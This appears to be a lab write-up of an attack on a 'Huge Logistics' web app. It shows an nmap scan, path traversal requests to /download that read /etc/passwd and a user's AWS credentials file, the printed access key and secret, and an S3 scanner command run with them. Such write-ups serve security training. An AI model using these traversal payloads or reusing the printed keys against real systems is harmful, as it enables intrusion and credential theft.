---
title: Path Traversal to AWS Credentials to S3 
---

# Entry Point

`13.50.73.5`

<br><br>

### NMAP

```
# Nmap 7.94SVN scan initiated Thu Oct 10 15:55:22 2024 as: nmap -p 80 -sC -sV -oA scans/port80 13.50.73.5
WARNING: Service 13.50.73.5:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for ec2-13-50-73-5.eu-north-1.compute.amazonaws.com (13.50.73.5)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: application/json
|     Content-Length: 163
|     {"error":{"message":"The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.","type":"NotFound"}}
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2359
|     Vary: Cookie
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/main.css">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/navbar.css">
|     <link rel="shortcut icon" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/images/favicon.ico">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/home.css">
|     <title>Home - Huge Logistics.</title>
|     </head>
|     <body>
|     <div class="navbar">
|     <ul>
|     <li><a class="nav-
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
|_http-title: Home - Huge Logistics.
```

# Website

![image](/assets/img/Pasted image 20241010155617.png)

### `/signup`

![image](/assets/img/Pasted image 20241010155922.png)

### `/invoices`

![image](/assets/img/Pasted image 20241010160026.png)

<br>

### LFI

![image](/assets/img/Pasted image 20241020230644.png)

![image](/assets/img/Pasted image 20241020230712.png)


```
GET /download?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
```

![image](/assets/img/Pasted image 20241020230735.png)

### Local Users

```
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
nedf:x:1001:1001::/home/nedf:/bin/bash
```

### AWS Credentials

```
GET /download?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fnedf%2F.aws%2Fcredentials HTTP/1.1
```

```
[default]
aws_access_key_id = AKIATWVWNKAVEUUNAYO6
aws_secret_access_key = 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
```

![image](/assets/img/Pasted image 20241020233131.png)

<br><br>

# AWS

### S3

```
huge-logistics-bucket.s3.eu-north-1.amazonaws.com
```

![image](/assets/img/Pasted image 20241021004217.png)

```bash
python3 /opt/aws-s3-scanner/s3-scanner/main.py --profile nedf --region eu-north-1 --bucket huge-logistics-bucket
```

![image](/assets/img/Pasted image 20241021004608.png)

